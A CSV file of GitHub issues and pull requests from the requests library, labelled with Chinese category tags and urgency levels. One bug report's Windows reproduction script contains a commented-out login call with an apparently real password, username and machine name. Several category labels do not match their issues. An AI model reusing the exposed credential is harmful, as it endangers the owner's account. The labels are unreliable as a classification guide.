id,title,body,category,urgency,html_url
2617295858,Refactor and optimize codebase,"Add new tests for `HTTPAdapter` and hooks.

* **tests/test_adapters.py**
  - Add `test_http_adapter_send` to test the `send` method of `HTTPAdapter`.
  - Add `test_http_adapter_cert_verify` to test the `cert_verify` method of `HTTPAdapter`.

* **tests/test_hooks.py**
  - Add `test_hooks_with_multiple_hooks` to test hooks with multiple functions.
  - Add `test_hooks_with_no_hooks` to test hooks with no functions.

---

For more details, open the [Copilot Workspace session](https://copilot-workspace.githubnext.com/akaday/requests?shareId=XXXX-XXXX-XXXX-XXXX).",功能建议,中,https://github.com/psf/requests/pull/6816
2615368736,Handle PermissionError when importing adapter.py,"In Windows, if the running process has restricted permissions the process may not have permission to read the file ""C:\\Users\\User\\Documents\\syskeylog.txt"". Sounds silly, but this error can propagate through dependencies and prevent them from complete importing, even if the functionality you expect from them do not depend on this project.



## Expected Result

Can import adapter.py

## Actual Result
```
    from pypac.parser import PACFile
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\pypac\__init__.py"", line 20, in <module>
    from pypac.api import (
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\pypac\api.py"", line 7, in <module>
    import requests
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\__init__.py"", line 164, in <module>
    from .api import delete, get, head, options, patch, post, put, request
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\api.py"", line 11, in <module>
    from . import sessions
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\sessions.py"", line 15, in <module>
    from .adapters import HTTPAdapter
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\adapters.py"", line 80, in <module>
    _preloaded_ssl_context = create_urllib3_context()
                             ^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\urllib3\util\ssl_.py"", line 349, in create_urllib3_context
    context.keylog_filename = sslkeylogfile
    ^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: 'C:\\Users\\User\\Documents\\syskeylog.txt'
```

## Reproduction Steps


Run the following code in Windows. You gotta remove a line and un-indent a block. See comment within the code.

```
import _winapi
import asyncio
import ctypes
import msvcrt
import os
import socket
import subprocess
import sys
import time
import traceback
import winreg
from ctypes import wintypes
from multiprocessing import spawn
from subprocess import Popen

import win32api
import win32con
import win32security
from _ctypes import byref, sizeof


def check_privilege():
    # Get the current process token
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)

    # Retrieve the privileges
    privileges = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
    elevation = win32security.GetTokenInformation(token, win32security.TokenElevation)
    print(elevation)
    # Check if the required privilege is present
    for privilege in privileges:
        print(f""{win32security.LookupPrivilegeName(None, privilege[0])} - {privilege[1]}"", file=sys.stderr)
    return False


def check_groups():
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)

    groups = win32security.GetTokenInformation(token, win32security.TokenGroups)

    for group, enabled in groups:
        name = win32security.LookupAccountSid(None, group)
        print(f""{group} - {name} - {hex(enabled)}"", file=sys.stderr)


def _get_token():
    # h_token = win32security.LogonUser(
    #     ""nopriv"",
    #     ""VAN-917843-PC3"",
    #     ""Stillcreekdr123!"",
    #     win32con.LOGON32_LOGON_INTERACTIVE,
    #     win32con.LOGON32_PROVIDER_DEFAULT
    # )

    # gid = _get_fnbi_group()
    # _add_fnbi_group_user()

    system_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                  win32con.TOKEN_DUPLICATE
                                                  | win32con.TOKEN_ADJUST_DEFAULT
                                                  | win32con.TOKEN_ADJUST_PRIVILEGES
                                                  | win32con.TOKEN_QUERY
                                                  | win32con.TOKEN_ASSIGN_PRIMARY
                                                  | win32con.TOKEN_ADJUST_GROUPS)
    low_integrity_SID = ""S-1-16-4096""
    # https://learn.microsoft.com/en-ca/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken
    # BOOL CreateRestrictedToken(
    #   [in]           HANDLE               ExistingTokenHandle,
    #   [in]           DWORD                Flags,
    #   [in]           DWORD                DisableSidCount,
    #   [in, optional] PSID_AND_ATTRIBUTES  SidsToDisable,
    #   [in]           DWORD                DeletePrivilegeCount,
    #   [in, optional] PLUID_AND_ATTRIBUTES PrivilegesToDelete,
    #   [in]           DWORD                RestrictedSidCount,
    #   [in, optional] PSID_AND_ATTRIBUTES  SidsToRestrict,
    #   [out]          PHANDLE              NewTokenHandle
    # );

    old_groups = win32security.GetTokenInformation(system_token, win32security.TokenGroups)
    disabled_sids = []
    restricted_sids = []
    enabled_masks = {
        ""S-1-1-0"", # everyone
        ""S-1-5-32-545"", # Users - needed for dev only?
        ""S-1-5-5"", # logon session - dev only
    }
    restricted_masks = {

    }

    def mask_match(entry: str, mask_set):
        for m in mask_set:
            if entry.startswith(m):
                return True
        return False

    for g, state in old_groups:
        sid_str = str(g).split("":"")[1]

        if mask_match(sid_str, restricted_masks):
            restricted_sids.append((g, 0))
            continue

        if mask_match(sid_str, enabled_masks):
            continue

        disabled_sids.append((g, 0))

    restricted_token = win32security.CreateRestrictedToken(
        system_token,
        win32security.DISABLE_MAX_PRIVILEGE,  # flags
        # None,
        disabled_sids,  # denied SIDS
        None,  # privs to delete
        restricted_sids  # restricted SIDS
    )

    til = (win32security.CreateWellKnownSid(win32security.WinLowLabelSid), win32security.SE_GROUP_INTEGRITY)
    win32security.SetTokenInformation(restricted_token, win32security.TokenIntegrityLevel, til)

    return restricted_token


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        (""cb"", wintypes.DWORD),  # Size of the structure
        (""lpReserved"", wintypes.LPWSTR),  # Reserved; must be NULL
        (""lpDesktop"", wintypes.LPWSTR),  # Name of the desktop
        (""lpTitle"", wintypes.LPWSTR),  # Title of the window
        (""dwX"", wintypes.DWORD),  # X position
        (""dwY"", wintypes.DWORD),  # Y position
        (""dwXSize"", wintypes.DWORD),  # Width of the window
        (""dwYSize"", wintypes.DWORD),  # Height of the window
        (""dwXCountChars"", wintypes.DWORD),  # Height of the window
        (""dwYCountChars"", wintypes.DWORD),  # Height of the window
        (""dwFillAttribute"", wintypes.DWORD),  # Height of the window
        (""dwFlags"", wintypes.DWORD),  # Flags
        (""wShowWindow"", wintypes.WORD),  # Show window command
        (""cbReserved2"", wintypes.WORD),  # Size of the reserved area
        (""lpReserved2"", wintypes.LPBYTE),  # Pointer to the reserved area
        (""hStdInput"", wintypes.HANDLE),  # Handle to standard input
        (""hStdOutput"", wintypes.HANDLE),  # Handle to standard output
        (""hStdError"", wintypes.HANDLE)  # Handle to standard error
    ]


class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        (""StartupInfo"", STARTUPINFO),
        (""lpAttributeList"", wintypes.LPVOID)
    ]


# Define PROCESS_INFORMATION structure
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        (""hProcess"", wintypes.HANDLE),
        (""hThread"", wintypes.HANDLE),
        (""dwProcessId"", wintypes.DWORD),
        (""dwThreadId"", wintypes.DWORD)
    ]


# Load the function
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
libc = ctypes.CDLL(""msvcrt.dll"")

# Define SetHandleInformation function
SetHandleInformation = kernel32.SetHandleInformation
SetHandleInformation.argtypes = [
    ctypes.wintypes.HANDLE,  # hObject
    ctypes.wintypes.DWORD,  # dwMask
    ctypes.wintypes.DWORD  # dwFlags
]
SetHandleInformation.restype = ctypes.wintypes.BOOL

CreateProcessW = kernel32.CreateProcessW
CreateProcessAsUser = advapi32.CreateProcessAsUserW
CREATE_UNICODE_ENVIRONMENT = 0x00000400
PROC_THREAD_ATTRIBUTE_LIST = 0x00020000
PROC_THREAD_ATTRIBUTE_HANDLE_LIST = 0x00020004
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
HANDLE_FLAG_INHERIT = 0x00000001
HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002


def get_last_error_message():
    error_code = ctypes.get_last_error()
    if error_code == 0:
        return ""No error.""

    message_buffer = ctypes.create_string_buffer(256)
    message_length = kernel32.FormatMessageA(
        0x00000001 | 0x00001000,  # FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER
        None,
        error_code,
        0,
        byref(message_buffer),
        ctypes.sizeof(message_buffer),
        None
    )

    if message_length == 0:
        return f""Unknown error code: {error_code}""
    msg = message_buffer.value.decode('ansi').replace('\r', '').replace('\n', '')
    return msg


foo = None


# Function to get Windows handle from file descriptor
def get_windows_handle(file):
    # Get the file descriptor
    fd = file.fileno()

    # Use _get_osfhandle to get the Windows handle
    handle = ctypes.windll.kernel32._get_osfhandle(fd)

    if handle == -1:
        raise ValueError(""Could not get the Windows handle."")

    return handle


def make_handle_inheritable(handle):
    if not SetHandleInformation(handle, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT):
        raise ctypes.WinError(ctypes.get_last_error())


def writer_main():
    def CreateProcess(cmd, cmdline, proc_attr, thread_attr, inherit_handles, creation_flags, current_directory,
                      environment, startup_info):
        # change_privilege(win32con.SE_PRIVILEGE_ENABLED)
        # check_privilege()

        token = _get_token()
        # CreateProcessAsUser
        #   0 [in, optional]      HANDLE                hToken,
        #   1 [in, optional]      LPCSTR                lpApplicationName,
        #   2 [in, out, optional] LPSTR                 lpCommandLine,
        #   3 [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        #   4 [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        #   5 [in]                BOOL                  bInheritHandles,
        #   6 [in]                DWORD                 dwCreationFlags,
        #   7 [in, optional]      LPVOID                lpEnvironment,
        #   8 [in, optional]      LPCSTR                lpCurrentDirectory,
        #   9 [in]                LPSTARTUPINFOA        lpStartupInfo,

        # CreateProcess
        #   0 [in, optional]      LPCSTR                lpApplicationName,
        #   1 [in, out, optional] LPSTR                 lpCommandLine,
        #   2 [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        #   3 [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        #   4 [in]                BOOL                  bInheritHandles,
        #   5 [in]                DWORD                 dwCreationFlags,
        #   6 [in, optional]      LPVOID                lpEnvironment,
        #   7 [in, optional]      LPCSTR                lpCurrentDirectory,
        #   8 [in]                LPSTARTUPINFOA        lpStartupInfo,
        six = STARTUPINFOEX()
        si = six.StartupInfo
        si.cb = ctypes.sizeof(STARTUPINFOEX)
        attribute_list_size = wintypes.DWORD()

        kernel32.InitializeProcThreadAttributeList(None, 1, 0, byref(attribute_list_size))

        buffer = (wintypes.BYTE * (attribute_list_size.value + 10))()
        six.lpAttributeList = ctypes.cast(buffer, wintypes.LPVOID)
        if not six.lpAttributeList:
            print(f""HeapAlloc failed with error: {get_last_error_message()}"")
            raise RuntimeError()

        if not kernel32.InitializeProcThreadAttributeList(
                byref(buffer),
                1,
                0,
                byref(attribute_list_size)
        ):
            print(f""InitializeProcThreadAttributeList failed with error: {get_last_error_message()}"")
            raise RuntimeError()
        if startup_info is not None:
            si.dwFlags |= win32con.STARTF_USESTDHANDLES  # Enable standard handle redirection
            si.hStdOutput = getattr(startup_info, ""hStdOutput"")  # Redirect standard output
            si.hStdInput = getattr(startup_info, ""hStdInput"")  # Redirect standard error
            si.hStdError = getattr(startup_info, ""hStdError"")  # Redirect standard error
            handle_list = [wintypes.HANDLE(si.hStdOutput), wintypes.HANDLE(si.hStdInput), wintypes.HANDLE(si.hStdError)]
            handle_count = len(handle_list)
            handles_array = (wintypes.HANDLE * handle_count)(*handle_list)  # Create an array of handles
            ctypes.windll.kernel32.UpdateProcThreadAttribute(
                buffer,
                0,
                PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
                handles_array,
                handle_count * sizeof(wintypes.HANDLE),
                None,
                None
            )

        pi = PROCESS_INFORMATION()
        success = advapi32.CreateProcessAsUserW(
            token.handle,
            python_exe, cmdline, proc_attr, thread_attr, inherit_handles,
            creation_flags | CREATE_UNICODE_ENVIRONMENT,
            environment, current_directory, byref(six), byref(pi)
        )

        # return TemporaryLibPatch.execute_unpatched(CreateProcess,
        #     python_exe, cmdline, proc_attr, thread_attr, inherit_handles,
        #     creation_flags,
        #     environment, current_directory, startup_info
        # )

        if not success:
            print(f""CreateProcessAsUser failed with error: {get_last_error_message()}"")
            raise RuntimeError()

        return pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId,

    file = open(__file__, 'r')
    handle = msvcrt.get_osfhandle(file.fileno())
    make_handle_inheritable(handle)
    
    _winapi.CreateProcess = CreateProcess
    # You can remove the context manager line below. It just wraps around the line above. The Github editor doesn't let me easily remove the indentation of the block....
    with TemporaryLibPatch(_winapi, CreateProcess): 
        def _path_eq(p1, p2):
            return p1 == p2 or os.path.normcase(p1) == os.path.normcase(p2)

        WINENV = _path_eq(sys.executable, sys._base_executable)

        python_exe = spawn.get_executable()
        set_pylauncher = False

        # FROM multiprocessing module:
        # # bpo-35797: When running in a venv, we bypass the redirect

        if WINENV and _path_eq(python_exe, sys.executable):
            python_exe = sys._base_executable
            set_pylauncher = True
            os.environ[""__PYVENV_LAUNCHER__""] = sys.executable

        proc = Popen([
            python_exe,
            __file__,
            ""--read"",
        ], stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=False,
            close_fds=False
        )

        if set_pylauncher:
            os.unsetenv(""__PYVENV_LAUNCHER__"")     
        proc.wait()


def reader_main():
     import requests


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == ""--read"":
        reader_main()
    else:
        writer_main()

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.8""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.5""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000d0""
  },
  ""urllib3"": {
    ""version"": ""2.2.2""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 账号问题, 文档问题, 性能问题",高,https://github.com/psf/requests/issues/6815
2601341152,update docs for `timeout` arguments to clarify that it uses seconds,fixes #6813,"Bug反馈, 网络连接失败, 文档问题",中,https://github.com/psf/requests/pull/6814
2601337465,`Session.request` documentation does not specify what unit of time the `timeout` argument uses,"[the documentation for `requests.request`](https://requests.readthedocs.io/en/latest/api/#requests.request) says this: 

> - **timeout** (_[float](https://docs.python.org/3/library/functions.html#float) or [tuple](https://docs.python.org/3/library/stdtypes.html#tuple)_) – (optional) How many seconds to wait for the server to send data before giving up, as a float, or a [(connect timeout, read timeout)](https://requests.readthedocs.io/en/latest/user/advanced/#timeouts) tuple.

however [the documentation for the same argument in `Session.request`](https://requests.readthedocs.io/en/latest/api/#requests.Session.request) does not clarify that it uses seconds: 

> - **timeout** (_[float](https://docs.python.org/3/library/functions.html#float) or [tuple](https://docs.python.org/3/library/stdtypes.html#tuple)_) – (optional) How long to wait for the server to send data before giving up, as a float, or a [(connect timeout, read timeout)](https://requests.readthedocs.io/en/latest/user/advanced/#timeouts) tuple.","功能建议, 账号问题, 网络连接失败, 文档问题",中,https://github.com/psf/requests/issues/6813
2598402633,Merge pull request #1 from psf/main,updated,功能建议,中,https://github.com/psf/requests/pull/6811
2597150655,Change auth.py to be used in a FIPS system,"<!-- Summary. -->

## Expected Result

Using the requests to perform a HTTPS action is working in a FIPS environment
 

<!-- What you expected. -->

## Actual Result

In UNIX environment with fips enabled the MD5 can't be used.
It provides this error

ValueError: [digital envelope routines: EVP_DigestInit_ex] disabled for FIPS

## Solution
Apply this patch in auth.py

`

*** 145,151 ****
                def md5_utf8(x):
                    if isinstance(x, str):
                        x = x.encode(""utf-8"")
  !                 return hashlib.md5(x).hexdigest()    
                hash_utf8 = md5_utf8
            elif _algorithm == ""SHA"":
--- 145,151 ----
                def md5_utf8(x):
                    if isinstance(x, str):
                        x = x.encode(""utf-8"")
  !                 return hashlib.md5(x,usedforsecurity=False).hexdigest()
                hash_utf8 = md5_utf8
            elif _algorithm == ""SHA"":

`
","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/issues/6810
2591762146,Retry hangs indefinitely for 503 status code,"When making a GET request to a URL that returns a 503 status code, the retry strategy causes the code to loop indefinitely, regardless of whether the 503 status code is included in the status_forcelist parameter.

## Expected Result

The retry mechanism should follow the configured retry policy (e.g., retry a specified number of times) and eventually raise an error after the maximum retries.

## Actual Result

The code retries indefinitely without raising an exception or stopping.


## Reproduction Steps

```python
import requests
from requests.adapters import HTTPAdapter, Retry

url = ""https://www.floraquatic.com/363-eau-de-mer-et-recifal""

session = requests.Session()
    
retry_strategy = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 504]) #You can add 503 here, same result is expected

adapter = HTTPAdapter(max_retries=retry_strategy)

session.mount(""https://"", adapter)



try:
    response = session.get(url)
    
    html_content = response.text
    
except Exception as e:
    print(str(e))

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": ""43.0.1""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.9""
  },
  ""platform"": {
    ""release"": ""5.15.0-122-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.2.1""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""1.26.20""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/6809
2579970702,Double-digit link-local IPv6 zone id raises ValueError,"When making a request to a link-local IPv6 address, it becomes necessary to specify the ""zone id"" aka ""scope id"". [RFC 6874](https://www.rfc-editor.org/rfc/rfc6874) specifies zone ids as follows:

> According to IPv6 Scoped Address syntax [[RFC4007](https://www.rfc-editor.org/rfc/rfc4007)], a zone identifier
>  is attached to the textual representation of an IPv6 address by
>  concatenating ""%"" followed by <zone_id>, where <zone_id> is a string
>  identifying the zone of the address.  However, the IPv6 Scoped
>  Address Architecture specification gives no precise definition of the
>  character set allowed in <zone_id>.  There are no rules or de facto
>  standards for this.  For example, the first Ethernet interface in a
>  host might be called %0, %1, %en1, %eth0, or whatever the implementer
>  happened to choose.
> 
>  In a URI, a literal IPv6 address is always embedded between ""["" and
>  ""]"".  This document specifies how a <zone_id> can be appended to the
>  address.  According to URI syntax [[RFC3986](https://www.rfc-editor.org/rfc/rfc3986)], ""%"" is always treated as
>  an escape character in a URI, so, according to the established URI
>  syntax [[RFC3986](https://www.rfc-editor.org/rfc/rfc3986)] any occurrences of literal ""%"" symbols in a URI MUST
>  be percent-encoded and represented in the form ""%25"".  Thus, the
>  scoped address fe80::a%en1 would appear in a URI as
>  http://[fe80::a%25en1].

I understand the above to mean that the ""zone id"" can be multiple characters (even when it's an integer.)

When using `requests.get` to request information from IoT devices using link-local networking, I occasionally see double-digit integer zone ids. An example of such a scoped address is `fe80::be0f:a7ff:fe00:2929%53`. As such, I'm escaping the `%` as `%25` as indicated in the RFC. (In this case, this has no effect on the results.)

## Expected Result

This does not throw.
```
import requests
host = 'fe80::be0f:a7ff:fe00:2929%2553'
url = f'http://[{host}]'
requests.get(url)
```

## Actual Result

It throws:
```
ValueError: 'fe80::be0f:a7ff:fe00:2929S' does not appear to be an IPv4 or IPv6 address
```

Some debugging reveals that `urllib3.util.parse_url` replaces `%25` with `%` in its result.

## Reproduction Steps

1. Run the code in the expected result section.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.3""
  },
  ""platform"": {
    ""release"": ""6.8.0-40-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.2.2""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 网络连接失败, 文档问题",中,https://github.com/psf/requests/issues/6808
2578757671,what is the point of this line?,https://github.com/psf/requests/blame/7335bbf480adc8e6aa88feb2022797a549a00aa3/src/requests/sessions.py#L746,功能建议,中,https://github.com/psf/requests/issues/6807
2566364683,Fix typo in documentation for verify,"The code for reference: https://github.com/psf/requests/blob/7335bbf480adc8e6aa88feb2022797a549a00aa3/src/requests/adapters.py#L336
","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/pull/6806
2560495194,Remove duplicate .eggs entry in .gitignore,,其他,中,https://github.com/psf/requests/pull/6805
